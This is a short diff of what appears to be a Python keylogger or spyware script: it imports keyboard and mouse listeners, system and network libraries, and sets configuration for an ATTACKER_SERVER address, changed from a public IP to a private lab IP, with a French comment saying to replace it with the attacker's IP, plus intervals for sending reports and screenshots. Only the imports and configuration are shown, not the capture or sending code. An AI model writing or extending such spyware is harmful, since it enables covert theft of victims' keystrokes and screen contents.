@@ -8,6 +8,7 @@ import socket
 import platform
 import subprocess
 import requests
+from io import BytesIO
 from datetime import datetime
 from pynput import keyboard, mouse
 import psutil
@@ -19,7 +20,7 @@ import shutil
 from pathlib import Path
 
 # Configuration
-ATTACKER_SERVER = "http://92.184.105.19:5000"  # À remplacer avec l'IP de l'attaquant
+ATTACKER_SERVER = "http://192.168.56.1:5000"  # À remplacer avec l'IP de l'attaquant
 REPORT_INTERVAL = 10  # Secondes entre chaque rapport
 SCREENSHOT_INTERVAL = 30  # Secondes entre chaque capture d'écran
 
